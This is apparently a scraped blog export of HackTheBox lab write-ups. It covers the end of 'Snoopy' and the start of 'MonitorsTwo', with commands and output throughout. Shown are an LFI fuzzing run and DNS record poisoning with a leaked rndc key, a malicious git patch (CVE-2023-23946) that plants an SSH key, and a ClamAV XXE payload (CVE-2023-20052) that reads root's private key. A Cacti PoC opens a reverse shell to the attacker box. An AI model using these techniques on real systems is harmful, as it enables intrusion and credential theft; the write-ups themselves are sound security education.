\u0026amp;\u0026amp; $filecontent !== \u0026#39;..\u0026#39;) { $content = preg_replace(\u0026#39;/\\.\\.\\//\u0026#39;, \u0026#39;\u0026#39;, $filecontent); $zip-\u0026gt;addFile($filecontent, $content); } } } else { $files = scandir($dir); foreach ($files as $file) { if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { $zip-\u0026gt;addFile($dir . \u0026#39;/\u0026#39; . $file, $file); } } } $zip-\u0026gt;close(); header(\u0026#39;Content-Type: application/zip\u0026#39;); header(\u0026#34;Content-Disposition: attachment; filename=press_release.zip\u0026#34;); header(\u0026#39;Content-Length: \u0026#39; . filesize($archive)); readfile($archive); unlink($archive); ?\u0026gt; The nginx configuration file includes config files for the virtual hosts, which could potentially give juicy information about the vhost.\n\u0026gt; python zip_file_read.py /etc/nginx/nginx.conf ...snip... ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; ...snip... As expected, there is a single configuration file for mm.snoopy.htb. It appears that the Mattermost instance hosts an API which uses WebSockets, and is running on localhost port 8056.\n\u0026gt; python zip_file_read.py /etc/nginx/conf.d/mattermost.conf Exception raised: File doesn\u0026#39;t exist \u0026gt; python zip_file_read.py /etc/nginx/conf.d/postgres.conf Exception raised: File doesn\u0026#39;t exist \u0026gt; python zip_file_read.py /etc/nginx/conf.d/provisions.conf Exception raised: File doesn\u0026#39;t exist \u0026gt; python zip_file_read.py /etc/nginx/conf.d/www.conf Exception raised: File doesn\u0026#39;t exist \u0026gt; python zip_file_read.py /etc/nginx/conf.d/mm.conf server { listen 80; server_name mm.snoopy.htb; http2_push_preload on; # Enable HTTP/2 Server Push location ~ /api/v[0-9]+/(users/)?websocket$ { proxy_set_header Upgrade $http_upgrade; ...snip... ...snip... proxy_http_version 1.1; proxy_pass http://localhost:8065; } location / { client_max_body_size 50M; proxy_set_header Connection \u0026#34;\u0026#34;; ...snip... ...snip... proxy_pass http://localhost:8065; } } DNS Poisoning #While fuzzing for other interesting files available via the file read vulnerability using ffuf, I found a few BIND config files, which relates to DNS (port 53).\n\u0026gt; ffuf -c -w /home/kali/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u \u0026#39;http://snoopy.htb/download?file=....//....//....//....//FUZZ\u0026#39; -t 100 -fs 0 ...snip... ...snip... /etc/bind/named.conf [Status: 200, Size: 497, Words: 2, Lines: 2, Duration: 2737ms] /etc/bind/named.conf.local [Status: 200, Size: 391, Words: 2, Lines: 3, Duration: 2747ms] /etc/bind/named.conf.options [Status: 200, Size: 625, Words: 2, Lines: 1, Duration: 2765ms] /etc/bind/zones.rfc1918 [Status: 200, Size: 320, Words: 3, Lines: 2, Duration: 2765ms] ...snip... The primary BIND configuration file, located at /etc/bind/named.conf, references a local config file and an rndc-key → BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=. BIND comes with a CLI tool, rndc that helps administer the DNS service for BIND. The rndc key is a shared key used to prevent unauthorized access, which means with this key I could make changes to the DNS configuration.\n// This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local include \u0026#34;/etc/bind/named.conf.options\u0026#34;; include \u0026#34;/etc/bind/named.conf.local\u0026#34;; include \u0026#34;/etc/bind/named.conf.default-zones\u0026#34;; key \u0026#34;rndc-key\u0026#34; { algorithm hmac-sha256; secret \u0026#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=\u0026#34;; }; The local config file provides two significant details:\nThe zone file is located at /var/lib/bind/db.snoopy.htb and it can be updated using the rndc-key. Zone transfers are allowed over the IP range 10.0.0.0/8, which explains why I was able to initiate the zone transfer earlier. As expected, the zone file doesn\u0026rsquo;t have any records for a mail server.\n\u0026gt; python zip_file_read.py /etc/bind/named.conf.local // // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \u0026#34;/etc/bind/zones.rfc1918\u0026#34;; zone \u0026#34;snoopy.htb\u0026#34; IN { type master; file \u0026#34;/var/lib/bind/db.snoopy.htb\u0026#34;; allow-update { key \u0026#34;rndc-key\u0026#34;; }; allow-transfer { 10.0.0.0/8; }; }; \u0026gt; python zip_file_read.py /var/lib/bind/db.snoopy.htb $ORIGIN . $TTL 86400 ; 1 day snoopy.htb IN SOA ns1.snoopy.htb. ns2.snoopy.htb. ( 2022032612 ; serial 3600 ; refresh (1 hour) 1800 ; retry (30 minutes) 604800 ; expire (1 week) 86400 ; minimum (1 day) ) NS ns1.snoopy.htb. NS ns2.snoopy.htb. $ORIGIN snoopy.htb. $TTL 86400 ; 1 day mattermost A 172.18.0.3 mm A 127.0.0.1 ns1 A 10.0.50.10 ns2 A 10.0.51.10 mattermost A 172.18.0.3 postgres A 172.18.0.2 provisions A 172.18.0.4 www A 127.0.0.1 Given that there are no records for mail.snoopy.htb in the zone file and I possess the rndc-key, it\u0026rsquo;s possible to add a DNS record pointing to my attack box. Since my tun0 IP falls within the 10.0.0.0/8 range, I can initiate the zone transfer. Dynamic DNS records can be updated using the nsupdate command, allowing me to add an A record for mail.snoopy.htb that directs to my attack box.\n❯ nsupdate \u0026gt; server 10.10.11.212 \u0026gt; key hmac-sha256:rndc-key BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA= \u0026gt; zone snoopy.htb \u0026gt; update add mail.snoopy.htb 86400 IN A 10.10.14.80 \u0026gt; show Outgoing update query: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: UPDATE, status: NOERROR, id: 0 ;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0 ;; ZONE SECTION: ;snoopy.htb. IN SOA ;; UPDATE SECTION: mail.snoopy.htb. 86400 IN A 10.10.14.80 \u0026gt; send Querying the mail server domain using dig confirms the new entry I just added.\n\u0026gt; dig +noall +nocmd +answer @10.10.11.212 mail.snoopy.htb mail.snoopy.htb. 86400 IN A 10.10.14.80 To test the password reset process, I set up an SMTP server on my attack box to receive password reset emails. Instead of using Python\u0026rsquo;s outdated smtpd module, I chose to use the aiosmtp module. I still need email addresses of existing users, fortunately, these email addresses conveniently listed on the team page.\nTo test the password reset, I set up an SMTP server on my attack box using aiosmtp instead of Python\u0026rsquo;s outdated smtpd module. The necessary email addresses for testing can be found from the team page, where they were conveniently listed.\nTeam emails I used Charles Shultz\u0026rsquo;s email address, cschultz@snoopy.htb since they are the CEO and and upon testing, immediately got a response on the SMTP server. The email contained a password reset link with a token.\n\u0026gt; aiosmtpd -n -l 10.10.14.80:25 ---------- MESSAGE FOLLOWS ---------- mail options: [\u0026#39;BODY=8BITMIME\u0026#39;] MIME-Version: 1.0 Auto-Submitted: auto-generated Message-ID: \u0026lt;zrwr8rz5nzi4z5k6-1689887681@mm.snoopy.htb\u0026gt; From: \u0026#34;No-Reply\u0026#34; \u0026lt;no-reply@snoopy.htb\u0026gt; Date: Thu, 20 Jul 2023 21:14:41 +0000 Subject: [Mattermost] Reset your password Content-Transfer-Encoding: 8bit Precedence: bulk Reply-To: \u0026#34;No-Reply\u0026#34; \u0026lt;no-reply@snoopy.htb\u0026gt; To: cschultz@snoopy.htb Content-Type: multipart/alternative; boundary=d971ea2ff7c8917b05af02f991d6a5e58be481fee9249b38ce66fd1e7b2e X-Peer: (\u0026#39;10.10.11.212\u0026#39;, 43424) --d971ea2ff7c8917b05af02f991d6a5e58be481fee9249b38ce66fd1e7b2e Content-Transfer-Encoding: quoted-printable Content-Type: text/plain; charset=UTF-8 Reset Your Password Click the button below to reset your password. If you didn=E2=80=99t reques= t this, you can safely ignore this email. Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dxdrwb= zawno1mfg7iniabra3n336d577r3pmfduh6kpaddfbbsrc6f4bhkhcz979b ) The password reset link expires in 24 hours. ...snip... ...snip... Since the encoding method used for the response is \u0026lsquo;Quoted printable\u0026rsquo;, used to decode 8-bit data in a 7-bit data path, need to decode it before using the token to reset the password. Not sure why the = was resolved, but based on the rest of the email it could an indictor of the end of line for SMTP or MIME.\nDecode password reset link After successfully resetting the password, I could log in as Charles Schultz (cschultz) on Mattermost. In the Town Square channel, I noticed a conversation where cbrown mentioned something about provisioning servers on demand, which is intriguing.\nMattermost Devsecops server Going through the available commands on the server, there\u0026rsquo;s one named provision-server, which pops up a form to provision a new server.\nUpon submitting the server provision request form, I received a simple \u0026lsquo;Form Submitted\u0026rsquo; message and a direct message from cbrown, asking if I can log in.\nProvision a new server Started a tcpdump capture on tun0 and applied source and destination filtering. It appears the server actually attempts to establish a TCP connection to port 2222 on my attack box.\n\u0026gt; _ tcpdump -i tun0 not src port 80 and not dst port 80 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 19:10:57.520219 IP snoopy.htb.45084 \u0026gt; 10.10.14.80.2222: Flags [S], seq 2880465282, win 64240, options [mss 1340,sackOK,TS val 3208739704 ecr 0,nop,wscale 7], length 0 ...snip... Given the context of a new server being provisioned, login attempts, and a TCP connection to port 2222, it\u0026rsquo;s possible that an SSH connection is being established. A netcat listener on port 2222 confirms that paramiko is being used to initiate an SSH connection.\n\u0026gt; nc -nlvp 2222 listening on [any] 2222 ... Connection from 10.10.11.212. Connection from 10.10.11.212:50278. SSH-2.0-paramiko_3.1.0 By utilizing an SSH honeypot like Cowrie, I was able to capture login credentials being used for SSH access. These logs reveal that cbrown is attempting to log in. Since paramiko suggests automated action, there\u0026rsquo;s a possibility that these credentials could be reused.\n\u0026gt; docker run -p 2222:2222/tcp cowrie/cowrie 2023-07-21T01:27:13+0000 [-] Python Version 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110] 2023-07-21T01:27:13+0000 [-] Twisted Version 22.10.0 2023-07-21T01:27:13+0000 [-] Cowrie Version 2.5.0 ...snip... ...snip... 2023-07-21T01:29:25+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b\u0026#39;cbrown\u0026#39;/b\u0026#39;sn00pedcr3dential!!!\u0026#39;] failed 2023-07-21T01:29:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b\u0026#39;cbrown\u0026#39; failed auth b\u0026#39;password\u0026#39; 2023-07-21T01:29:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: () This looked like another intriguing SSH honeypot project, although it may require additional manual setup compared to Cowrie.\n\u0026gt; make \u0026gt; ssh-keygen -t rsa -f ./ssh-honeypot.rsa \u0026gt; bin/ssh-honeypot -r ./ssh-honeypot.rsa \u0026gt; bin/ssh-honeypot -r ./ssh-honeypot.rsa -p 2222 [Thu Jul 20 20:43:25 2023] ssh-honeypot 0.2.0 started on port 2222. PID 132349 [Thu Jul 20 20:44:34 2023] 10.10.11.212 cbrown sn00pedcr3dential!!! [Thu Jul 20 20:45:34 2023] HASSHServer: 10.10.14.80 6c4602ed7d5fded0306a85b6f99ec588 sport: 2222 ttl: 64 [Thu Jul 20 20:45:34 2023] HASSH: 10.10.11.212 a704be057881f0b1d623cd263e477a8b sport: 58496 ttl: 64 Shell as cbrown #As anticipated, cbrown\u0026rsquo;s\u0026rsquo; credentials are reused for SSH login. Additionally, the user cbrown is part of the devops group, although there don\u0026rsquo;t seem to be any directories or files owned or writable by it.\n\u0026gt; pc [21:38:25] Welcome to pwncat 🐈! __main__.py:164 [21:38:28] snoopy.htb:22: registered new host w/ db manager.py:957 (local) pwncat$ (remote) cbrown@snoopy.htb:/home/cbrown$ id uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops) sbrown@snoopy:~$ find / -group devops 2\u0026gt;/dev/null sbrown@snoopy:~$ find / -group devops -writable 2\u0026gt;/dev/null Horizontal Privilege Escalation # CVE-2023-23946 #The user, cbrown has sudo privileges, and can apply a git patch as sbrown.\n(remote) cbrown@snoopy.htb:/home/cbrown$ sudo -l [sudo] password for cbrown: Matching Defaults entries for cbrown on snoopy: env_keep+=\u0026#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\u0026#34;, env_keep+=\u0026#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\u0026#34;, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpass User cbrown may run the following commands on snoopy: (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$ (remote) cbrown@snoopy.htb:/home/cbrown$ git --version git version 2.34.1 While searching for exploits related to git apply, found an security advisory and a corresponding CVE, CVE-2023-23946. This vulnerability allows an attacker to write to files outside the working copy by using a symbolic link through a malicious patch. I couldn\u0026rsquo;t find any public PoCs for this CVE, the closest I came was the commit used to fix the vulnerability itself:\napply: fix writing behind newly created symbolic links · git/git@fade728 openembedded-core/meta/recipes-devtools/git/files/CVE-2023-23946.patch Ideally, git has safeguards when applying patches ensuring anything malicious isn\u0026rsquo;t allowed, like creating files in places they shouldn\u0026rsquo;t be based on a symbolic link. According to the exploit, if the patch itself is a symbolic link this can be bypassed. I can use a malicious patch file that will use the symlink pointing to sbrown\u0026rsquo;s SSH directory, to write a new authorized_keys file which contains my public key ensuring I can login using the identity key.\n(remote) cbrown@snoopy.htb:/tmp$ mkdir repo (remote) cbrown@snoopy.htb:/tmp$ cd repo (remote) cbrown@snoopy.htb:/tmp/repo$ git init -q (remote) cbrown@snoopy.htb:/tmp/repo$ ln -s /home/sbrown/.ssh/ symlink (remote) cbrown@snoopy.htb:/tmp/repo$ vi patch Patch file\ndiff --git a/symlink b/renamed-symlink similarity index 100% rename from symlink rename to renamed-symlink -- diff --git /dev/null b/renamed-symlink/authorized_keys new file mode 100644 index 0000000..039727e --- /dev/null +++ b/renamed-symlink/authorized_keys @@ -0,0 +1,1 @@ +ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDwvc5b566DlqhUovNwyExA4Jq/0ftC32rC0MLgeQbuMXlQGDdjk44FxSPgaaTWTBlPiUEWprrA0lW6NAX+CZF3t6r2Aw9sxhZGa09AMvbJPeGRtaVkfoj7RnZ1L8YXqTdhGRgsjwexxiYIvgMIBmngEJ/B0hf/ixbA2olly1wSnAHDOCTC/+FSOx74utS57I+iROzwTXr9mGs4z0acjrS08kKBlO5qqApStQUu8PXZaHeyh3k0l6CJ6PMO0RXrcOQQz0ngJ05t8tJAZihi8ALzV/IN98JVhqn+CkV/FY6AnYcsv1kXcWB6hIh29fHyhe1jFrFA/HK6nsXIzEYoJVchyi65cVGT8B6txbBheiY+SCZcosy1gY3ANeVVkW0ybKtL9uBJuH8s4gCFq5pXomVToXiqDSkrL+hjdHfIgdLDSPtUh1/BF6fepJGG4MgeA/KY5cS+TFtnAVF4m4L1ZuHR32qZoK2o7GeRUiALuZ0MYY8xXOArwkAH9pa/sa51L0= kali@kali However, when attempting to apply the patch, I get a permission error. Not entirely sure the reason, but I am assuming since the symlink points to a location cbrown doesn\u0026rsquo;t have access to could be reason.\n(remote) cbrown@snoopy.htb:/tmp/repo$ sudo -u sbrown /usr/bin/git apply -v patch Checking patch symlink =\u0026gt; renamed-symlink... Checking patch renamed-symlink/authorized_keys... warning: unable to unlink \u0026#39;symlink\u0026#39;: Permission denied error: unable to write file \u0026#39;renamed-symlink\u0026#39; mode 120000: No such file or directory In an attempt to resolve this, changed the directory permissions to rwx for everybody which seemed to fix the issue. Applying the patch now successfully creates a new authorized_keys file with my public key in it file.\n(remote) cbrown@snoopy.htb:/tmp/repo$ chmod 777 /tmp/repo (remote) cbrown@snoopy.htb:/tmp/repo$ sudo -u sbrown /usr/bin/git apply -v patch Checking patch symlink =\u0026gt; renamed-symlink... Checking patch renamed-symlink/authorized_keys... Applied patch symlink =\u0026gt; renamed-symlink cleanly. Applied patch renamed-symlink/authorized_keys cleanly. (remote) cbrown@snoopy.htb:/tmp/repo$ ls patch renamed-symlink Now using the identity key, I can login as sbrown via SSH.\n\u0026gt; ssh sbrown@snoopy.htb -i id_rsa.sbrown ...snip... Last login: Fri Aug 4 11:28:23 2023 from 10.10.14.77 sbrown@snoopy:~$ id uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops) sbrown@snoopy:~$ Vertical Privilege Escalation # CVE 2023-20052 #The user, sbrown again has sudo privileges to run ClamAV on specific files in the /home/sbrown/scanfiles directory with the debug flag set. The debug flag will Enable libclamav\u0026rsquo;s debug messages\nsbrown@snoopy:~$ sudo -l Matching Defaults entries for sbrown on snoopy: env_keep+=\u0026#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\u0026#34;, env_keep+=\u0026#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\u0026#34;, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpass User sbrown may run the following commands on snoopy: (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$ sbrown@snoopy:~$ clamscan --version ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023 Going through the help message, the -f option reads files from the provided file and prints each line before processing them, as it expects these to be filenames. Additionally, there\u0026rsquo;s a --copy option designed to copy the infected file to a specified directory. However, due to the regex pattern ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$, it seems both these options cannot be used for escalation.\nI did find a CVE, CVE 2023-20052 for ClamAV\u0026rsquo;s DMG file parser for versions ≤ 1.0.0 that exploits a XXE vuln. Exploiting this vulnerability involves creating a crafted DMG file that substitutes an XML entity, ultimately enabling unauthorized access to read files through ClamAV. To exploit this CVE, I used a publicly available PoC, which includes a Docker container for generating a DMG image and injecting the XXE payload. By using the binary block editor to inject the XXE payload, I can read root\u0026rsquo;s SSH key at /root/.ssh/id_rsa.\n\u0026gt; docker run -v $(pwd):/exploit -it cve-2023-20052 bash root@ec8a06805207:/exploit# genisoimage -D -V \u0026#34;exploit\u0026#34; -no-pad -r -apple -file-mode 0777 -o test.img . \u0026amp;\u0026amp; dmg dmg test.img test.dmg genisoimage: Warning: no Apple/Unix files will be decoded/mapped Total translation table size: 0 Total rockridge attributes bytes: 542 Total directory bytes: 782 Path table size(bytes): 10 Max brk space used 0 52 extents written (0 MB) Processing DDM... No DDM! Just doing one huge blkx then... run 0: sectors=208, left=208 Writing XML data... Generating UDIF metadata... Master checksum: 32dd518b Writing out UDIF resource file... Cleaning up... Done root@ec8a06805207:/exploit# bbe -e \u0026#39;s|\u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple Computer//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt;|\u0026lt;!DOCTYPE plist [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;/root/.ssh/id_rsa\u0026#34;\u0026gt; ]\u0026gt;|\u0026#39; -e \u0026#39;s/blkx/\u0026amp;xxe\\;/\u0026#39; test.dmg -o exploit.dmg root@ec8a06805207:/exploit# ls -al total 276 drwxr-xr-x 2 1000 1000 4096 Aug 4 18:55 . drwxr-xr-x 1 root root 4096 Aug 4 18:55 .. -rw-r--r-- 1 1000 1000 24963 Aug 4 18:52 1.png -rw-r--r-- 1 1000 1000 22855 Aug 4 18:52 2.png -rw-r--r-- 1 1000 1000 556 Aug 4 18:52 Dockerfile -rw-r--r-- 1 1000 1000 859 Aug 4 18:52 README.md -rw-r--r-- 1 root root 51826 Aug 4 18:55 exploit.dmg -rw-r--r-- 1 root root 51876 Aug 4 18:55 test.dmg -rw-r--r-- 1 root root 106496 Aug 4 18:55 test.img root@ec8a06805207:/exploit# exit exit After transferring the exploit, exploit.dmg to the /home/sbrown/scanfiles/ directory to satisfy the regex pattern, because of the debug flag I was able to read root\u0026rsquo;s identity key, allowing me to gain SSH access with escalated privileges, i.e., root.\nsbrown@snoopy:~/scanfiles$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0 LibClamAV debug: Initialized 1.0.0 engine ...snip... ...snip... LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/ 4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw ...snip... \u0026gt; ssh root@snoopy.htb -i id_rsa.root ...snip... root@snoopy:~# id uid=0(root) gid=0(root) groups=0(root) root@snoopy:~# ls -la total 21744 drwx------ 7 root root 4096 May 12 21:29 . drwxr-xr-x 19 root root 4096 Apr 25 18:38 .. lrwxrwxrwx 1 root root 9 Mar 26 00:50 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrc drwx------ 3 root root 4096 Mar 18 16:57 .cache drwx------ 3 root root 4096 Apr 25 10:42 .config drwx------ 3 root root 4096 Mar 18 17:02 .docker -rw-r--r-- 1 root root 161 Jul 9 2019 .profile drwx------ 2 root root 4096 Mar 25 13:07 .ssh -rw------- 1 root root 837 May 12 21:29 .viminfo -rw-r--r-- 1 root root 13379846 Nov 28 2022 clamav-1.0.0.linux.x86_64.deb -rwxr-x--- 1 root root 218 May 7 17:07 clean.sh drwxr-xr-x 4 root root 4096 Mar 24 22:17 containers -rw-r--r-- 1 root root 916 Mar 27 03:23 db.snoopy.htb -rw-r--r-- 1 root root 5566650 Mar 19 03:04 git_2.34.1-1ubuntu1.6_amd64.deb -rwxr-xr-x 1 root root 215 May 12 21:29 named_restore.sh -rw-r----- 1 root root 33 Aug 4 05:47 root.txt -rw-r--r-- 1 root root 3252796 May 7 17:06 sudo_1.9.13-4_ubu2204_amd64.deb root@snoopy:~# Pwned!!\nRelated Links # Updating DNS Records Systematically When Using External DNS linux - how to update Records using nsupdate? - Unix \u0026amp; Linux Stack Exchange DNS (Domain Name Systems) Pentesting | Exploit Notes nsupdate Command - IBM Documentation aiosmtpd - An asyncio based SMTP server documentation Cowrie’s documentation Git security vulnerabilities announced - The GitHub Blog \u0026ldquo;git apply\u0026rdquo; overwriting paths outside the working tree · Advisory · git/git openembedded-core/meta/recipes-devtools/git/files/CVE-2023-23946.patch apply: fix writing behind newly created symbolic links · git/git@fade728 How to Prevent the CVE-2023-20052 ClamAV XXE Vulnerability CVE-2023-20052 · GitHub Advisory Database nokn0wthing/CVE-2023-20052: CVE-2023-20052, information leak vulnerability in the DMG file parser of ClamAV ","date":"23 September 2023","permalink":"/blog/htb-snoopy/","section":"Blog Posts","summary":"Snoopy is a Hard Linux box where I start by exploiting a file read vulnerability on the primary site, which allowed me to access BIND DNS config files and the rndc key. With this access, I could update DNS records for the mail server. With control over the mail server, I reset a user\u0026rsquo;s password to access a Mattermost site. During server provisioning, I set up a honeypot to capture SSH credentials. Once inside the server, I exploited a Git apply command vulnerability, enabling me to write to files outside the working copy. Finally, I leveraged an XXE vulnerability in ClamAV\u0026rsquo;s DMG parser to read root\u0026rsquo;s SSH keys.","title":"HTB Snoopy"},{"content":"","date":null,"permalink":"/tags/nsupdate/","section":"Tags","summary":"","title":"Nsupdate"},{"content":"","date":null,"permalink":"/tags/ssh-honeypot/","section":"Tags","summary":"","title":"SSH Honeypot"},{"content":"","date":null,"permalink":"/tags/xxe/","section":"Tags","summary":"","title":"XXE"},{"content":"","date":null,"permalink":"/tags/zone-transfer/","section":"Tags","summary":"","title":"Zone-Transfer"},{"content":"","date":null,"permalink":"/tags/cacti/","section":"Tags","summary":"","title":"Cacti"},{"content":"","date":null,"permalink":"/tags/cve-2021-41091/","section":"Tags","summary":"","title":"CVE-2021-41091"},{"content":"","date":null,"permalink":"/tags/cve-2022-46169/","section":"Tags","summary":"","title":"CVE-2022-46169"},{"content":"","date":null,"permalink":"/tags/docker-engine/","section":"Tags","summary":"","title":"Docker-Engine"},{"content":"MonitorsTwo HTB #Overview # MonitorsTwo is an Easy Linux box that involves exploiting an outdated version of Cacti. This exploit allows to gain a shell within a Docker container. The container also hosts a MariaDB database that stores user credentials, which are reused for SSH access. Finally, to escalate privileges to root a vulnerability in the Docker engine is exploited.\nEnumeration # Open Ports #Found two open ports using nmap:\nport 22 → SSH port 80 → HTTP ( Nginx ) # Nmap 7.93 scan initiated Sat May 27 18:43:07 2023 as: nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.211 10.10.11.211 Nmap scan report for 10.10.11.211 Host is up (0.060s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Login to Cacti Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 27 18:43:18 2023 -- 1 IP address (1 host up) scanned in 10.65 seconds port 80 - HTTP #According to the headers, the application is PHP-based and has a Cacti cookie.\n\u0026gt; http -ph 10.10.11.211 HTTP/1.1 200 OK ...snip... Server: nginx/1.18.0 (Ubuntu) Set-Cookie: Cacti=5858d37213025b985bb3a40be5837333; path=/; HttpOnly; SameSite=Strict ...snip... X-Powered-By: PHP/7.4.33 The index directs to a login page for Cacti. Additionally, it mentions the version of the software → v1.2.22\nCacti provides a robust and extensible operational monitoring and fault management framework for users around the world. It is also a complete network graphing solution designed to harness the power of RRDTool\u0026rsquo;s data storage and graphing functionality.\nFoothold # Cacti version 1.2.22 is vulnerable to CVE-2022-46169, which allows unauthenticated users to execute arbitrary commands with the same privileges as the web server process. This vulnerability comprises two issues: an authentication bypass in remote.php and a command injection due to the poller_id parameter used with proc_open().\nFound a PoC for the CVE on GitHub, which includes a built-in feature to spawn a reverse shell.\n\u0026gt; python cacti.py Enter the target address (like \u0026#39;http://123.123.123.123:8080\u0026#39;) http://10.10.11.211/ Checking vulnerability... App is vulnerable Brute forcing id... Enter your IPv4 addressed 10.10.14.75 Enter the port you want to listen on 9005 Delivering payload... Once the vulnerability in Cacti is exploited, I get a shell as the user www-data since Cacti is run as www-data.\n\u0026gt; pc -lp 9005 [19:40:25] Welcome to pwncat 🐈! [19:51:00] received connection from 10.10.11.211:46380 [19:51:01] 0.0.0.0:9001: upgrading from /usr/sbin/nologin to /bin/bash [19:51:03] 10.10.11.211:46380: registered new host w/ db (local) pwncat$ (remote) www-data@50bca5e748b0:/var/www/html$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) (remote) www-data@50bca5e748b0:/var/www/html$ There\u0026rsquo;s also a metasploit module available for this CVE, exploit/linux/http/cacti_unauthenticated_cmd_injection\nPrivilege Escalation # Container root escalation #It seems Cacti is being hosted in a Docker container.\nThe presence of a .dockerenv file and an entrypoint.sh script in the root directory. The IP address is of the format 172.x.x.x The hostname resembles a container ID, which is a common naming convention in Docker environments. It is a restricted environment, basic commands like ip or ifconfig are not available (remote) www-data@50bca5e748b0:/$ cat /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.19.0.3 50bca5e748b0 (remote) www-data@50bca5e748b0:/$ l total 452 drwxr-xr-x 1 root root 4096 Mar 21 10:49 . drwxr-xr-x 1 root root 4096 Mar 21 10:49 .. -rwxr-xr-x 1 root root 0 Mar 21 10:49 .dockerenv ...snip... ...snip... (remote) www-data@50bca5e748b0:/$ ip a bash: ip: command not found (remote) www-data@50bca5e748b0:/$ ifconfig bash: ifconfig: command not found The container doesn\u0026rsquo;t have sudo, but it does have a few binaries with the SUID bit set and owned by root.\n(remote) www-data@50bca5e748b0:/$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/bash /bin/su The capsh binary is uncommon. Using the exploit from GTFObins, can escalate to root within the container.\nNormally, processes have the same real-uid (the UID of the user executing the binary) and effective-uid (the UID of the owner). However, in the case of binaries with the SUID bit set, the effective-uid is changed to the file\u0026rsquo;s owner, while the real-uid remains the same, essentially granting the processes escalated privileges.\n(remote) www-data@50bca5e748b0:/$ capsh --gid=0 --uid=0 -- root@50bca5e748b0:/# id uid=0(root) gid=0(root) groups=0(root),33(www-data) root@50bca5e748b0:/# The entrypoint.sh file is executed during the container startup and is accessible only to the root user. It can provide valuable information about the container\u0026rsquo;s configuration and initialization process.\n(remote) www-data@50bca5e748b0:/$ ls -la entrypoint.sh -rw-r--r-- 1 root root 648 Jan 5 11:37 entrypoint.sh (remote) root@50bca5e748b0:/# cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo \u0026#34;database is connected\u0026#34; if [[ ! $(mysql --host=db 